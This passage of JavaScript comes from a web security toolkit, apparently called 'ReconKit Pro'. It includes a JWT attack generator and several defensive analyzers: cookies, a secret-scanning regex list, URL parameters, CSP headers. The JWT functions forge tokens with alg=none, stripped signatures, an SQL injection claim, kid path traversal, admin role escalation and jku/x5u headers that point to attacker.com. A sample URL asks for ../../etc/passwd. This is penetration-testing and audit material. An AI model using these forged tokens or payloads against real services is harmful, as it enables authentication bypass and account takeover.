  const sevClass={crit:'alert-error',high:'alert-warn',med:'alert-info',low:'alert-success'};
  document.getElementById('attackResults').innerHTML=results.map(r=>`
    <div class="alert ${sevClass[r.sev]||'alert-info'}" style="flex-direction:column;align-items:flex-start;margin-bottom:8px;">
      <div style="font-weight:bold;margin-bottom:4px;">${r.name}</div>
      <div style="margin-bottom:6px;font-size:10px;">${r.desc||''}</div>
      ${r.token?`<div style="word-break:break-all;font-size:10px;background:rgba(0,0,0,0.2);padding:6px;border-radius:4px;margin-top:4px;cursor:pointer;" onclick="copyText('${r.token}');showToast()" title="Click to copy">${escHtml(r.token.substring(0,100))}${r.token.length>100?'...':''}</div>`:''}
    </div>`).join('');
}

// Attack implementations
window.noneAttack=async(token)=>{
  const p=token.split('.');
  if(p.length<2)return null;
  const h=JSON.parse(b64urlDecode(p[0])||'{}');
  h.alg='none';
  const newH=b64urlEncode(JSON.stringify(h));
  const attacked=newH+'.'+p[1]+'.';
  return{desc:'Signed token with alg=none and empty signature. Test if server accepts.',token:attacked};
};
window.algConfusion=async(token)=>{
  const p=token.split('.');
  if(p.length<2)return null;
  const h=JSON.parse(b64urlDecode(p[0])||'{}');
  h.alg='HS256';
  return{desc:'Changed algorithm to HS256. If server uses public key as HMAC secret, re-sign with that key.',token:b64urlEncode(JSON.stringify(h))+'.'+p[1]+'.SIGNATURE_NEEDED'};
};
window.algSubstitution=async(token)=>{
  const p=token.split('.');
  const h=JSON.parse(b64urlDecode(p[0])||'{}');
  const orig=h.alg;
  h.alg='HS384';
  return{desc:`Changed alg from ${orig} to HS384 (keeping original signature). Tests algorithm validation.`,token:b64urlEncode(JSON.stringify(h))+'.'+p[1]+'.'+(p[2]||'')};
};
window.emptySignature=async(token)=>{
  const p=token.split('.');
  return{desc:'Removed signature entirely. Tests if server validates signature presence.',token:p[0]+'.'+p[1]+'.'};
};
window.nullByte=async(token)=>{
  const p=token.split('.');
  const payload=JSON.parse(b64urlDecode(p[1])||'{}');
  const orig=payload.sub||payload.username||'user';
  payload.sub=(payload.sub||'user')+'%00admin';
  return{desc:`Injected null byte in sub claim: "${orig}%00admin". Some parsers truncate at null.`,token:'[Modify payload and re-sign]: '+JSON.stringify(payload)};
};
window.sqlInClaim=async(token)=>{
  const p=token.split('.');
  const payload=JSON.parse(b64urlDecode(p[1])||'{}');
  payload.sub="' OR '1'='1";
  return{desc:'Injected SQL payload into sub claim. Re-sign and test if server uses JWT claims in SQL queries.',token:'[Payload to use]: '+JSON.stringify(payload)};
};
window.kidInjection=async(token)=>{
  const p=token.split('.');
  const h=JSON.parse(b64urlDecode(p[0])||'{}');
  h.kid='../../../../dev/null';
  return{desc:'kid set to path traversal. If server loads key file based on kid, /dev/null returns empty = HMAC secret is empty string.',token:b64urlEncode(JSON.stringify(h))+'.'+p[1]+'.HMAC_EMPTY_SECRET'};
};
window.expManipulation=async(token)=>{
  const p=token.split('.');
  const payload=JSON.parse(b64urlDecode(p[1])||'{}');
  const old=payload.exp;
  payload.exp=Math.floor(Date.now()/1000)+999999;
  return{desc:`Extended exp from ${old} to ${payload.exp}. Re-sign token to test expiration validation.`,token:'[New payload]: '+JSON.stringify(payload)};
};
window.roleEscalation=async(token)=>{
  const p=token.split('.');
  const payload=JSON.parse(b64urlDecode(p[1])||'{}');
  const orig=JSON.stringify(payload);
  payload.role='admin';payload.isAdmin=true;payload.scope='*';
  return{desc:`Original: ${orig} → Added admin role/scope. Re-sign to test role validation.`,token:'[Escalated payload]: '+JSON.stringify(payload)};
};
window.jkuInjection=async(token)=>{
  const p=token.split('.');
  const h=JSON.parse(b64urlDecode(p[0])||'{}');
  h.jku='https://attacker.com/.well-known/jwks.json';
  return{desc:'Injected attacker-controlled JWK Set URL. If server fetches keys from jku header, attacker can provide own public key.',token:b64urlEncode(JSON.stringify(h))+'.'+p[1]+'.ATTACKER_SIGNED'};
};
window.x5uInjection=async(token)=>{
  const p=token.split('.');
  const h=JSON.parse(b64urlDecode(p[0])||'{}');
  h.x5u='https://attacker.com/cert.pem';
  return{desc:'x5u header injection. If server fetches x509 cert from this URL, SSRF or key confusion possible.',token:b64urlEncode(JSON.stringify(h))+'.'+p[1]+'.'+p[2]};
};
window.embeddedJwk=async(token)=>{
  const p=token.split('.');
  const h=JSON.parse(b64urlDecode(p[0])||'{}');
  h.jwk={kty:'RSA',n:'ATTACKER_N_VALUE',e:'AQAB'};
  return{desc:'Embedded attacker public JWK in header. If server uses jwk header to verify, generate your own RSA pair.',token:b64urlEncode(JSON.stringify(h))+'.'+p[1]+'.ATTACKER_SIGNED'};
};

// ALG INFO
function initAlgInfo(){
  const algs=[
    {name:'HS256',family:'HMAC',key:'Shared secret (symmetric)',hash:'SHA-256',use:'Most common; symmetric — same secret to sign and verify',vuln:'Weak if secret is guessable; alg confusion attacks'},
    {name:'HS384',family:'HMAC',key:'Shared secret (symmetric)',hash:'SHA-384',use:'Higher security HMAC; same risks as HS256',vuln:'Weak secrets; brute-forceable'},
    {name:'HS512',family:'HMAC',key:'Shared secret (symmetric)',hash:'SHA-512',use:'Strongest HMAC variant',vuln:'Still symmetric — key exposure = full compromise'},
    {name:'RS256',family:'RSA',key:'RSA key pair (asymmetric)',hash:'SHA-256',use:'API auth where verifier ≠ signer; public key can be distributed',vuln:'RS→HS confusion if server accepts both; weak key gen'},
    {name:'RS384',family:'RSA',key:'RSA key pair (asymmetric)',hash:'SHA-384',use:'RS256 variant with stronger hash',vuln:'Same as RS256'},
    {name:'RS512',family:'RSA',key:'RSA key pair (asymmetric)',hash:'SHA-512',use:'Strongest RSA variant',vuln:'Same as RS256'},
    {name:'ES256',family:'ECDSA',key:'EC key pair (P-256)',hash:'SHA-256',use:'Compact signatures; mobile/IoT',vuln:'Nonce reuse can leak private key; Sony PS3 attack'},
    {name:'ES384',family:'ECDSA',key:'EC key pair (P-384)',hash:'SHA-384',use:'Higher security ECDSA',vuln:'Same nonce risks'},
    {name:'ES512',family:'ECDSA',key:'EC key pair (P-521)',hash:'SHA-512',use:'Highest security ECDSA',vuln:'Same nonce risks'},
    {name:'PS256',family:'RSA-PSS',key:'RSA key pair (asymmetric)',hash:'SHA-256 + MGF1',use:'Probabilistic RSA; stronger than PKCS1v1.5',vuln:'Key exposure; implementation bugs'},
    {name:'EdDSA',family:'Edwards-curve',key:'Ed25519/Ed448 key pair',hash:'internal',use:'Modern; fast; strong',vuln:'Relatively new — fewer libraries; timing attacks in bad implementations'},
    {name:'none',family:'Unsecured',key:'None',hash:'None',use:'Testing only — NEVER in production',vuln:'CRITICAL: No signature — anyone can forge tokens'},
  ];
  document.getElementById('algInfoGrid').innerHTML=algs.map(a=>`
    <div class="card">
      <div class="card-title" style="font-size:13px;">
        <span class="dot ${a.name==='none'?'dot-red':a.family.includes('HMAC')?'dot-orange':'dot-cyan'}"></span>
        ${a.name}
        <span class="flag ${a.name==='none'?'flag-danger':a.family==='HMAC'?'flag-warn':'flag-info'}" style="font-size:9px;">${a.family}</span>
      </div>
      <table class="cookie-attr-table" style="font-size:10px;">
        <tr><td>Key Type</td><td>${a.key}</td></tr>
        <tr><td>Hash</td><td>${a.hash}</td></tr>
        <tr><td>Use Case</td><td>${a.use}</td></tr>
        <tr><td style="color:var(--red);">Vulnerabilities</td><td style="color:var(--orange);">${a.vuln}</td></tr>
      </table>
    </div>`).join('');
}

// ════════════════════════════════════════════════════════════
// COOKIE ANALYZER
// ════════════════════════════════════════════════════════════
let cookieInited=false;
function initCookie(){
  cookieInited=true;
  renderCookieChecklist();
}

function parseSingleCookie(raw){
  const parts=raw.split(';').map(s=>s.trim());
  const firstEq=parts[0].indexOf('=');
  const name=firstEq>-1?parts[0].substring(0,firstEq):parts[0];
  const value=firstEq>-1?parts[0].substring(firstEq+1):'';
  const attrs={};
  for(let i=1;i<parts.length;i++){
    const kv=parts[i].split('=');
    const k=(kv[0]||'').trim().toLowerCase();
    const v=(kv[1]||'').trim();
    attrs[k]=v||true;
  }
  return{name,value,attrs};
}

function parseCookies(){
  const raw=document.getElementById('cookieInput').value.trim();
  if(!raw){return;}
  const lines=raw.split('\n').filter(l=>l.trim());
  const cookies=lines.map(parseSingleCookie);
  renderCookieParsed(cookies);
  renderCookieAudit(cookies);
}

function renderCookieParsed(cookies){
  let html='';
  cookies.forEach(c=>{
    html+=`<div style="margin-bottom:14px;">
      <div style="color:var(--cyan);font-family:Rajdhani,sans-serif;font-size:13px;font-weight:600;margin-bottom:6px;">
        🍪 ${escHtml(c.name)}
      </div>
      <table class="cookie-attr-table">
        <tr><td>Name</td><td>${escHtml(c.name)}</td></tr>
        <tr><td>Value</td><td style="word-break:break-all;max-width:300px;">${escHtml(c.value)}</td></tr>
        <tr><td>Length</td><td>${c.value.length} chars</td></tr>
        ${Object.entries(c.attrs).map(([k,v])=>`<tr><td>${escHtml(k)}</td><td>${v===true?'✓':escHtml(v)}</td></tr>`).join('')}
      </table>
    </div>`;
  });
  document.getElementById('cookieParsed').innerHTML=html||'<span style="color:var(--text-dim);">No cookies parsed.</span>';
}

function renderCookieAudit(cookies){
  const findings=[];
  cookies.forEach(c=>{
    const a=c.attrs;
    if(!a.httponly&&!a['httponly'])findings.push({sev:'danger',msg:`[${c.name}] Missing HttpOnly flag — accessible via JavaScript (XSS risk)`});
    if(!a.secure)findings.push({sev:'danger',msg:`[${c.name}] Missing Secure flag — transmitted over HTTP`});
    const ss=a.samesite;
    if(!ss)findings.push({sev:'warn',msg:`[${c.name}] Missing SameSite attribute — CSRF risk`});
    else if(ss.toLowerCase()==='none')findings.push({sev:'warn',msg:`[${c.name}] SameSite=None — requires Secure flag; CSRF risk`});
    if(!a.path)findings.push({sev:'info',msg:`[${c.name}] No Path attribute — defaults to current path`});
    if(!a.domain)findings.push({sev:'info',msg:`[${c.name}] No Domain attribute — host-only cookie`});
    if(a.expires){
      const exp=new Date(a.expires);
      const days=(exp-Date.now())/(1000*60*60*24);
      if(days>365)findings.push({sev:'warn',msg:`[${c.name}] Very long expiry: ${Math.round(days)} days`});
    }
    // Value analysis
    if(c.value.length>4096)findings.push({sev:'warn',msg:`[${c.name}] Oversized cookie value (${c.value.length} chars)`});
    if(c.value.startsWith('eyJ'))findings.push({sev:'info',msg:`[${c.name}] Value looks like a JWT — inspect in JWT tab`});
    if(/^[0-9a-f]{32,64}$/i.test(c.value))findings.push({sev:'info',msg:`[${c.name}] Hex-encoded value (session token?)`});
    if(c.value.includes('%'))findings.push({sev:'info',msg:`[${c.name}] URL-encoded value — decode for inspection`});
  });
  const sevCls={danger:'alert-error',warn:'alert-warn',info:'alert-info'};
  const sevIcon={danger:'✗',warn:'⚠',info:'ℹ'};
  document.getElementById('cookieAudit').innerHTML=findings.length
    ?findings.map(f=>`<div class="alert ${sevCls[f.sev]}" style="margin-bottom:6px;">${sevIcon[f.sev]} ${escHtml(f.msg)}</div>`).join('')
    :'<div class="alert alert-success">✓ No obvious security issues detected.</div>';
}

function loadSampleCookie(){
  document.getElementById('cookieInput').value=
    'session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c; Path=/; Domain=.example.com; Expires=Thu, 01 Jan 2026 00:00:00 GMT\n'+
    'auth_token=abc123def456; HttpOnly; Secure; SameSite=Strict; Path=/api\n'+
    'preference=dark_mode%3Dtrue%26lang%3Den; SameSite=None';
  parseCookies();
}
function clearCookies(){
  document.getElementById('cookieInput').value='';
  document.getElementById('cookieAudit').innerHTML='Paste and analyze cookies to see security flags.';
  document.getElementById('cookieParsed').innerHTML='Cookie attributes appear here after analysis.';
}

function decodeCookieVal(type){
  const val=document.getElementById('cookieDecodeInput').value;
  let result='';
  try{
    if(type==='url')result=decodeURIComponent(val);
    else if(type==='b64')result=atob(val);
    else if(type==='b64url'){
      let s=val.replace(/-/g,'+').replace(/_/g,'/');
      while(s.length%4)s+='=';
      result=atob(s);
    }
    else if(type==='hex')result=val.match(/.{1,2}/g).map(b=>String.fromCharCode(parseInt(b,16))).join('');
    else if(type==='jwt'){
      const parts=val.split('.');
      if(parts.length>=2){
        const h=JSON.parse(b64urlDecode(parts[0])||'{}');
        const p=JSON.parse(b64urlDecode(parts[1])||'{}');
        result='HEADER:\n'+JSON.stringify(h,null,2)+'\n\nPAYLOAD:\n'+JSON.stringify(p,null,2);
      } else result='Not a valid JWT';
    }
    document.getElementById('cookieDecodeOutput').innerHTML=`<button class="copy-corner" onclick="copyEl('cookieDecodeOutput')">⎘</button>${escHtml(result)}`;
    document.getElementById('cookieDecodeOutput').style.color='var(--green)';
  }catch(e){
    document.getElementById('cookieDecodeOutput').innerHTML=`<button class="copy-corner" onclick="copyEl('cookieDecodeOutput')">⎘</button><span style="color:var(--red);">Decode error: ${escHtml(e.message)}</span>`;
  }
}

function renderCookieChecklist(){
  const checks=[
    {icon:'🔒',name:'Secure Flag',desc:'Cookie only sent over HTTPS',risk:'HIGH — Plaintext interception possible without Secure flag',fix:'Set-Cookie: name=value; Secure'},
    {icon:'🚫',name:'HttpOnly Flag',desc:'Cookie inaccessible to JavaScript',risk:'HIGH — XSS can steal session cookies without HttpOnly',fix:'Set-Cookie: name=value; HttpOnly'},
    {icon:'🛡',name:'SameSite Attribute',desc:'Controls cross-site request behavior',risk:'MEDIUM — CSRF attacks possible without SameSite',fix:'Set-Cookie: name=value; SameSite=Strict (or Lax)'},
    {icon:'📍',name:'Path Restriction',desc:'Limit cookie scope to specific paths',risk:'LOW — Overly broad scope exposes cookie unnecessarily',fix:'Set-Cookie: name=value; Path=/api'},
    {icon:'🌐',name:'Domain Attribute',desc:'Restrict cookie to specific domain',risk:'LOW — Omitting creates host-only cookie (more secure)',fix:'Set-Cookie: name=value; Domain=.example.com'},
    {icon:'⏰',name:'Expiry / Max-Age',desc:'Set appropriate session lifetime',risk:'MEDIUM — Long-lived cookies increase attack window',fix:'Set-Cookie: name=value; Max-Age=3600'},
    {icon:'🔑',name:'Session ID Entropy',desc:'Session tokens must be cryptographically random',risk:'HIGH — Predictable tokens can be forged',fix:'Use minimum 128-bit random values (32 hex chars)'},
    {icon:'🔄',name:'Token Rotation',desc:'Rotate session ID after authentication',risk:'HIGH — Session fixation attacks',fix:'Generate new token after login/privilege change'},
    {icon:'🔐',name:'Encrypted Values',desc:'Sensitive data in cookies should be encrypted',risk:'HIGH — Cookie theft exposes plaintext data',fix:'Use authenticated encryption (AES-GCM) for sensitive values'},
    {icon:'📝',name:'Cookie Prefixing',desc:'Use __Secure- or __Host- prefixes',risk:'MEDIUM — Browser enforces security requirements for prefixed cookies',fix:'__Host-session=value; Secure; Path=/; HttpOnly'},
  ];
  document.getElementById('cookieChecklist').innerHTML=checks.map(c=>`
    <div class="card">
      <div style="font-size:18px;margin-bottom:6px;">${c.icon}</div>
      <div style="font-family:Rajdhani,sans-serif;font-size:13px;font-weight:600;color:var(--text-bright);margin-bottom:4px;">${c.name}</div>
      <div style="font-size:10px;color:var(--text-dim);margin-bottom:6px;">${c.desc}</div>
      <div class="alert alert-warn" style="font-size:9px;padding:5px 8px;margin-bottom:6px;">${c.risk}</div>
      <div style="font-size:10px;color:var(--green);font-family:JetBrains Mono,monospace;">${escHtml(c.fix)}</div>
    </div>`).join('');
}

// ════════════════════════════════════════════════════════════
// UTILS
// ════════════════════════════════════════════════════════════
// SECRET SCANNER
let secretInited=false;
let lastSecretReport='';
let lastSecretRedacted='';
function initSecretScanner(){secretInited=true;}

const SECRET_PATTERNS=[
  {name:'AWS Access Key ID',sev:'crit',re:/\b(A3T[A-Z0-9]|AKIA|ASIA)[A-Z0-9]{16}\b/g},
  {name:'GitHub Personal Access Token',sev:'crit',re:/\bgh[pousr]_[A-Za-z0-9_]{30,255}\b/g},
  {name:'GitHub Fine-grained Token',sev:'crit',re:/\bgithub_pat_[A-Za-z0-9_]{40,255}\b/g},
  {name:'GitLab Token',sev:'crit',re:/\bglpat-[A-Za-z0-9_-]{20,}\b/g},
  {name:'Slack Token',sev:'crit',re:/\bxox[abprs]-[A-Za-z0-9-]{10,}\b/g},
  {name:'Slack Webhook',sev:'crit',re:/https:\/\/hooks\.slack\.com\/services\/[A-Za-z0-9/_-]+/g},
  {name:'Discord Webhook',sev:'crit',re:/https:\/\/discord(?:app)?\.com\/api\/webhooks\/[A-Za-z0-9/_-]+/g},
  {name:'Stripe Secret Key',sev:'crit',re:/\bsk_(?:live|test)_[A-Za-z0-9]{16,}\b/g},
  {name:'Stripe Publishable Key',sev:'warn',re:/\bpk_(?:live|test)_[A-Za-z0-9]{16,}\b/g},
  {name:'Google API Key',sev:'crit',re:/\bAIza[0-9A-Za-z_-]{35}\b/g},
  {name:'SendGrid API Key',sev:'crit',re:/\bSG\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\b/g},
  {name:'Private Key Block',sev:'crit',re:/-----BEGIN [A-Z ]*PRIVATE KEY-----[\s\S]*?-----END [A-Z ]*PRIVATE KEY-----/g},
  {name:'JWT',sev:'warn',re:/\beyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]*\b/g},
  {name:'MongoDB URI',sev:'crit',re:/mongodb(?:\+srv)?:\/\/[^\s'"]+/g},
  {name:'Postgres URI',sev:'crit',re:/postgres(?:ql)?:\/\/[^\s'"]+/g},
  {name:'Redis URI',sev:'crit',re:/rediss?:\/\/[^\s'"]+/g},
  {name:'Basic Auth URL',sev:'crit',re:/https?:\/\/[^\/\s'":]+:[^\/\s'"]+@[^\s'"]+/g},
  {name:'Secret Assignment',sev:'warn',re:/\b(?:api[_-]?key|secret|token|password|passwd|client_secret|db_password|jwt_secret)\b\s*[:=]\s*['"]?[^'"\s]{8,}/gi}
];
function entropyScore(str){
  const s=String(str||'');
  if(!s)return 0;
  const freq={};
  for(const ch of s)freq[ch]=(freq[ch]||0)+1;
  return Object.values(freq).reduce((sum,n)=>{
    const p=n/s.length;
    return sum-(p*Math.log2(p));
  },0);
}
function maskSecret(v){
  const s=String(v);
  if(s.length<=10)return '***REDACTED***';
  return s.slice(0,4)+'...'+s.slice(-4);
}
function scanSecrets(){
  const text=document.getElementById('secretInput').value||'';
  const hits=[];
  const seen=new Set();
  SECRET_PATTERNS.forEach(p=>{
    p.re.lastIndex=0;
    let m;
    while((m=p.re.exec(text))){
      const value=m[0];
      const key=p.name+'|'+m.index+'|'+value.slice(0,32);
      if(seen.has(key))continue;
      seen.add(key);
      hits.push({type:p.name,sev:p.sev,value,index:m.index,entropy:entropyScore(value)});
    }
  });
  const entropyRe=/\b[A-Za-z0-9_+\/=.-]{32,}\b/g;
  let em;
  while((em=entropyRe.exec(text))){
    const value=em[0];
    if(value.startsWith('http')||value.includes('example.com'))continue;
    const e=entropyScore(value);
    if(e>=3.85&&!hits.some(h=>h.index===em.index)){
      hits.push({type:'High-entropy unknown',sev:'warn',value,index:em.index,entropy:e});
    }
  }
  hits.sort((a,b)=>a.index-b.index);
  lastSecretRedacted=text;
  [...hits].sort((a,b)=>b.index-a.index).forEach(h=>{
    lastSecretRedacted=lastSecretRedacted.slice(0,h.index)+maskSecret(h.value)+lastSecretRedacted.slice(h.index+h.value.length);
  });
  renderSecretResults(hits);
}
function renderSecretResults(hits){
  const crit=hits.filter(h=>h.sev==='crit').length;
  const ent=hits.filter(h=>h.type.includes('entropy')).length;
  const risk=Math.min(100,crit*18+(hits.length-crit)*8+ent*6);
  const safety=Math.max(0,100-risk);
  document.getElementById('sec-total-stat').textContent=hits.length;
  document.getElementById('sec-critical-stat').textContent=crit;
  document.getElementById('sec-entropy-stat').textContent=ent;
  const ring=document.getElementById('secretScoreRing');
  ring.style.setProperty('--score',safety);
  ring.querySelector('b').textContent=safety;
  document.querySelector('#tab-secrets .score-panel .deck-title').textContent=hits.length?'Secrets need triage':'No obvious secrets';
  document.getElementById('secretRedacted').textContent=lastSecretRedacted||'No redacted output.';
  lastSecretReport=[
    'ReconKit Pro - Local Secret Scan',
    `Matches: ${hits.length}`,
    `Critical: ${crit}`,
    '',
    ...hits.map(h=>`[${h.sev.toUpperCase()}] ${h.type} at offset ${h.index}: ${maskSecret(h.value)} entropy=${h.entropy.toFixed(2)}`)
  ].join('\n');
  document.getElementById('secretFindings').innerHTML=hits.length?hits.map(h=>`
    <div class="finding ${h.sev==='crit'?'crit':'warn'}">
      <strong>${escHtml(h.type)} · ${h.sev.toUpperCase()}</strong>
      ${escHtml(maskSecret(h.value))}<br>Offset ${h.index} · entropy ${h.entropy.toFixed(2)}
    </div>`).join(''):'<div class="finding ok"><strong>No obvious secrets found</strong>No built-in pattern or high-entropy token matched this input.</div>';
}
function loadSampleSecrets(){
  document.getElementById('secretInput').value=[
    'AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE',
    'STRIPE_SECRET=sk_live_51NexampleSecretTokenValue999999',
    'GITHUB_TOKEN=ghp_abcdefghijklmnopqrstuvwxyzABCDE12345',
    'DATABASE_URL=postgres://admin:supersecret@app.example.com:5432/prod',
    'JWT_SECRET=Zx92LkP0q9s8N7m6B5v4C3x2Z1a0ExampleEntropy'
  ].join('\n');
  scanSecrets();
}
function clearSecretScanner(){
  document.getElementById('secretInput').value='';
  lastSecretReport='';
  lastSecretRedacted='';
  renderSecretResults([]);
  document.getElementById('secretRedacted').textContent='Run a scan to generate a redacted copy.';
}
function copySecretReport(){if(!lastSecretReport)scanSecrets();copyText(lastSecretReport||'No secret report.');}
function copyRedactedSecrets(){if(!lastSecretRedacted)scanSecrets();copyText(lastSecretRedacted||'');}

// URL INTELLIGENCE
let urlIntelInited=false;
let lastUrlWordlist='';
function initUrlIntel(){urlIntelInited=true;}
const PARAM_CLASSES=[
  {cat:'Open Redirect',sev:'crit',names:['next','url','redirect','return','returnurl','returnto','continue','dest','destination','redir']},
  {cat:'SSRF / Fetch',sev:'crit',names:['url','uri','path','endpoint','host','domain','callback','webhook','feed','proxy','fetch']},
  {cat:'File / LFI',sev:'crit',names:['file','path','page','template','include','load','download','doc','document','folder','dir']},
  {cat:'Search / XSS Surface',sev:'warn',names:['q','query','search','s','keyword','term','message','comment','name']},
  {cat:'IDOR / SQLi Surface',sev:'warn',names:['id','uid','user','account','order','invoice','product','item','cat','category','ref']},
  {cat:'Auth / Sensitive',sev:'crit',names:['token','auth','key','api_key','apikey','session','jwt','code','secret']},
  {cat:'Debug / Environment',sev:'warn',names:['debug','test','dev','stage','env','trace','verbose']}
];
function classifyParam(name){
  const n=String(name).toLowerCase();
  return PARAM_CLASSES.find(c=>c.names.includes(n)||c.names.some(x=>n.includes(x)));
}
function analyzeUrlIntel(){
  const lines=(document.getElementById('urlIntelInput').value||'').split(/\r?\n/).map(x=>x.trim()).filter(Boolean);
  const findings=[];
  const mini=[];
  const params=new Map();
  let valid=0;
  lines.forEach(line=>{
    try{
      const u=new URL(line);
      valid++;
      mini.push({k:u.hostname,v:u.pathname||'/'});
      u.searchParams.forEach((val,key)=>{
        params.set(key,(params.get(key)||0)+1);
        const cls=classifyParam(key);
        if(cls)findings.push({kind:cls.sev==='crit'?'crit':'warn',title:`${cls.cat}: ${key}`,msg:`${u.hostname}${u.pathname} has ${key}=${val||'(empty)'}`});
        if(/\.\.\//.test(val))findings.push({kind:'crit',title:`Traversal-looking value: ${key}`,msg:`Value contains ../ in ${line}`});
        if(/^https?:\/\//i.test(val))findings.push({kind:'warn',title:`URL value in parameter: ${key}`,msg:`External URL-like value can indicate redirect, callback, or SSRF behavior.`});
      });
      if(u.protocol!=='https:')findings.push({kind:'warn',title:'Non-HTTPS URL',msg:line});
    }catch(e){
      findings.push({kind:'info',title:'Invalid URL skipped',msg:line});
    }
  });
  lastUrlWordlist=[...params.keys()].sort().join('\n');
  const risk=findings.filter(f=>f.kind==='crit'||f.kind==='warn').length;
  const score=Math.max(0,100-risk*7);
  renderUrlIntel({valid,params,findings,mini,score});
}
function renderUrlIntel(r){
  document.getElementById('url-total-stat').textContent=r.valid;
  document.getElementById('url-param-stat').textContent=[...r.params.values()].reduce((a,b)=>a+b,0);
  document.getElementById('url-risk-stat').textContent=r.findings.filter(f=>f.kind==='crit'||f.kind==='warn').length;
  const ring=document.getElementById('urlScoreRing');
  ring.style.setProperty('--score',r.score);
  ring.querySelector('b').textContent=r.score;
  document.querySelector('#tab-urlintel .score-panel .deck-title').textContent=r.score>=80?'Low-risk URL set':r.score>=55?'Interesting parameters found':'High-priority parameter review';
  document.getElementById('urlWordlist').textContent=lastUrlWordlist||'No parameters found.';
  document.getElementById('urlMiniGrid').innerHTML=r.mini.slice(0,12).map(m=>`<div class="mini-check"><div class="k">${escHtml(m.k)}</div><div class="v">${escHtml(m.v)}</div></div>`).join('')||'<div class="mini-check"><div class="k">Status</div><div class="v">No valid URLs yet</div></div>';
  document.getElementById('urlFindings').innerHTML=r.findings.length?r.findings.map(f=>`<div class="finding ${f.kind}"><strong>${escHtml(f.title)}</strong>${escHtml(f.msg)}</div>`).join(''):'<div class="finding ok"><strong>No risky parameters detected</strong>The URL set did not match the built-in risk classifiers.</div>';
}
function loadSampleUrlIntel(){
  document.getElementById('urlIntelInput').value=[
    'https://example.com/redirect?next=https://partner.example',
    'https://app.example.com/download?file=../../etc/passwd&debug=true',
    'http://api.example.com/user?id=42&token=abc123',
    'https://shop.example.com/search?q=test'
  ].join('\n');
  analyzeUrlIntel();
}
function clearUrlIntel(){
  document.getElementById('urlIntelInput').value='';
  lastUrlWordlist='';
  renderUrlIntel({valid:0,params:new Map(),findings:[{kind:'info',title:'No analysis yet',msg:'Paste URLs and run the analyzer.'}],mini:[],score:0});
}
function copyUrlWordlist(){if(!lastUrlWordlist)analyzeUrlIntel();copyText(lastUrlWordlist||'');}

// POLICY BUILDER
let policyInited=false;
function initPolicyBuilder(){policyInited=true;buildSecurityPolicy();}
function buildSecurityPolicy(){
  const profile=document.getElementById('policyProfile')?.value||'strict';
  const script=(document.getElementById('policyScript')?.value||'').trim();
  const img=(document.getElementById('policyImg')?.value||'').trim();
  const connect=(document.getElementById('policyConnect')?.value||'').trim();
  const noFrame=document.getElementById('policyNoFrame')?.checked;
  const preload=document.getElementById('policyPreload')?.checked;
  const reportOnly=document.getElementById('policyReportOnly')?.checked;
  const cspName=reportOnly?'Content-Security-Policy-Report-Only':'Content-Security-Policy';
  const base={
    strict:["default-src 'self'","base-uri 'self'","object-src 'none'","form-action 'self'"],
    api:["default-src 'none'","frame-ancestors 'none'","base-uri 'none'"],
    marketing:["default-src 'self'","base-uri 'self'","object-src 'none'","form-action 'self'"],
    embed:["default-src 'self'","base-uri 'self'","object-src 'none'"]
  }[profile]||[];
  if(script)base.push(`script-src 'self' ${script}`);
  else if(profile!=='api')base.push("script-src 'self'");
  if(img)base.push(`img-src 'self' ${img}`);
  else if(profile!=='api')base.push("img-src 'self' data:");
  if(connect)base.push(`connect-src 'self' ${connect}`);
  else if(profile!=='api')base.push("connect-src 'self'");
  if(noFrame&&!base.some(x=>x.startsWith('frame-ancestors')))base.push("frame-ancestors 'none'");
  if(profile==='embed')base.push('frame-src https:');
  const hsts=`Strict-Transport-Security: max-age=31536000; includeSubDomains${preload?'; preload':''}`;
  const headers=[
    `${cspName}: ${base.join('; ')}`,
    hsts,
    'X-Content-Type-Options: nosniff',
    noFrame?'X-Frame-Options: DENY':'',
    'Referrer-Policy: no-referrer',
    'Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()',
    'Cross-Origin-Opener-Policy: same-origin',
    'Cross-Origin-Resource-Policy: same-origin'
  ].filter(Boolean);
  document.getElementById('policyOutput').textContent=headers.join('\n');
  const nginx=headers.map(h=>`add_header ${h.split(':')[0]} "${h.slice(h.indexOf(':')+2)}" always;`).join('\n');
  const apache=headers.map(h=>`Header always set ${h.split(':')[0]} "${h.slice(h.indexOf(':')+2)}"`).join('\n');
  document.getElementById('policyServerSnippets').textContent=`# Nginx\n${nginx}\n\n# Apache\n${apache}`;
}

// HEADER CHECKER
let headerInited=false;
let lastHeaderReport='';

function initHeaderChecker(){
  headerInited=true;
}

function parseRawHeaders(raw){
  const headers={};
  const entries=[];
  let lastKey=null;
  String(raw||'').split(/\r?\n/).forEach(line=>{
    if(!line.trim())return;
    if(/^HTTP\//i.test(line)||/^\s*status\s*:/i.test(line))return;
    if(/^\s+/.test(line)&&lastKey){
      headers[lastKey][headers[lastKey].length-1]+=' '+line.trim();
      return;
    }
    const idx=line.indexOf(':');
    if(idx<1)return;
    const name=line.slice(0,idx).trim();
    const value=line.slice(idx+1).trim();
    const key=name.toLowerCase();
    headers[key]=headers[key]||[];
    headers[key].push(value);
    entries.push({name,value,key});
    lastKey=key;
  });
  return {headers,entries};
}
function getHeader(map,name){return (map[name.toLowerCase()]||[]).join(', ');}
function getAllHeaders(map,name){return map[name.toLowerCase()]||[];}
function headerHas(map,name,needle){return getHeader(map,name).toLowerCase().includes(String(needle).toLowerCase());}

function analyzeHeaders(){
  const raw=document.getElementById('headerInput').value;
  const parsed=parseRawHeaders(raw);
  const h=parsed.headers;
  const findings=[];
  const mini=[];
  let score=100;
  const add=(kind,title,msg,penalty=0)=>{findings.push({kind,title,msg});score-=penalty;};
  const miniAdd=(k,v)=>mini.push({k,v});

  const hsts=getHeader(h,'strict-transport-security');
  if(hsts){
    const maxAge=Number((hsts.match(/max-age=(\d+)/i)||[])[1]||0);
    if(maxAge>=31536000)miniAdd('HSTS','Strong');
    else add('warn','HSTS max-age is low',`Current Strict-Transport-Security is "${hsts}". Use max-age=31536000 or higher for production.`,6);
